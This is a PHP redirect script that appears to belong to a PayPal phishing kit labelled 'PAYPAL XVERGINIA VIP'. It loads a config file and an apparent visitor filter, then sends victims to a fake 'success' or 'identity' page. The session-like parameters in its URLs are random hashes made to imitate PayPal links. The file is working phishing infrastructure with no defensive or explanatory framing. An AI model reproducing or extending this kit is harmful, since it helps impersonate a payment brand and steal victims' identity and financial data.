<?php
 
 error_reporting(E_ERROR | E_PARSE);

// PAYPAL XVERGINIA VIP

	include('../../functions/Config.php');
	include('../Safe/xanbbx.php');
	
if($XV_SELECT == "select")
{
	 HEADER("Location: ../success/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
}
	else
{
	 HEADER("Location: ../identity/?cmd=_session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."", true, 303);
}
?>